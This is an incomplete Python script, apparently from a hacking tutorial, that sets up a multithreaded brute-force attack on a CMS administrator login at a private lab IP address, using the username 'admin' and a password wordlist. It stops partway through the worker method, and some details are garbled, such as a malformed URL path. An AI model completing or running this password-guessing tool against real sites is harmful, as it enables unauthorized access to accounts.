import urllib3
import urllib
import threading
import sys
import queue
import html.parser
import http.cookiejar

user_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

# where script will donload and parse HTML
target_url = "http://192.168.112.131/administrator/index/php"
# where we will submit brute-forcing attempt
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_filed = "passwd"

# string to check for to see if we are successful
success_check = "Administration - Control Panel"

class Bruter():
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: %s" % username)

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = http.cookiejar.FileCookieJar("Cookies")

